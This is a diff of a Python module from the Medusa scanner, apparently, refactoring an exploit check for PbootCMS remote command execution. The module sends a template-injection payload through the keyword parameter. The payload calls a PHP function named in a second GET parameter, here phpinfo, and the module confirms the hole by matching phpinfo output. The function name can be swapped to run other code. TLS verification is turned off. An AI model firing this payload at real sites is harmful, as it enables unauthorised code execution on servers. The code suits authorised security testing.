@@ -3,9 +3,7 @@
 
 __author__ = 'Ascotbe'
 __date__ = '2019/10/11 16:39 PM'
-from urllib import request
-import ClassCongregation
-import urllib.parse
+import ClassCongregation,requests
 
 class VulnerabilityInfo(object):
     def __init__(self,Medusa):
@@ -24,38 +22,23 @@ class VulnerabilityInfo(object):
         self.info['details'] = Medusa  # 结果
 
 
-def UrlProcessing(url):
-    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
-        res = urllib.parse.urlparse(url)
-    else:
-        res = urllib.parse.urlparse('http://%s' % url)
-    return res.scheme, res.hostname, res.port
-
-def medusa(Url:str,Headers:dict,proxies:str=None,**kwargs)->None:
-    proxies=ClassCongregation.Proxies().result(proxies)
-
-    scheme, url, port = UrlProcessing(Url)
-    if port is None and scheme == 'https':
-        port = 443
-    elif port is None and scheme == 'http':
-        port = 80
-    else:
-        port = port
+def medusa(**kwargs)->None:
+    url = kwargs.get("Url")  # 获取传入的url参数
+    Headers = kwargs.get("Headers")  # 获取传入的头文件
+    proxies = kwargs.get("Proxies")  # 获取传入的代理参数
     try:
         payload="/index.php/index/index?keyword={pboot:if(1)$a=$_GET[b];$a();//)})}}{/pboot:if}&b=phpinfo"
-        payload_url = scheme + "://" + url +":"+ str(port) + payload
+        payload_url = url + payload
         Headers['Content-Type']='application/x-www-form-urlencoded'
         Headers['Accept']='text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
-
-        req = request.Request(payload_url, headers=Headers,)
-        response = request.urlopen(req)
-        con = response.read().decode('utf8')  # 如果编码报错，去除HTTP Header中的gzip参数即可
-        code = response.getcode()
+        resp = requests.get(payload_url,headers=Headers, timeout=6,proxies=proxies, verify=False)
+        con = resp.text
+        code = resp.status_code
         if code == 200 and con.find('System') != -1 and con.find('Build Date') != -1 and con.find(
                 'Compiler') != -1 and con.find('PHP Version') != -1:
             Medusa = "{} 存在PbootCMS命令执行漏洞\r\n漏洞地址:\r\n{}\r\n漏洞详情:\r\n{}".format(url,payload_url,con)
             _t=VulnerabilityInfo(Medusa)
-            ClassCongregation.VulnerabilityDetails(_t.info, url,**kwargs).Write()  # 传入url和扫描到的数据
+            ClassCongregation.VulnerabilityDetails(_t.info, resp,**kwargs).Write()  # 传入url和扫描到的数据
             ClassCongregation.WriteFile().result(str(url), str(Medusa))  # 写入文件，url为目标文件名统一传入，Medusa为结果
     except Exception as e:
         _ = VulnerabilityInfo('').info.get('algroup')
